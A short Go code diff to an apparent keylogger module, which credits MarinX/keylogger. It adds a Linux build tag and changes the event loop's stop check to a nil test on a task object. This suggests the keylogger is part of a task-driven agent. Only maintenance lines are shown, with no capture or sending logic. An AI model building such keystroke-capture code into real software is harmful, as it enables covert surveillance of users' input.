@@ -1,3 +1,4 @@
+//go:build linux
 // +build linux
 
 // This is taken from MarinX/keylogger
@@ -314,7 +315,7 @@ func keystateMonitor(k *KeyLogger) {
 	// range of events
 	// logrus.Println("Initialized. Listening for events...")
 	for e := range events {
-		if *curTask.Job.Stop > 0 {
+		if curTask == nil {
 			break
 		}
 		switch e.Type {
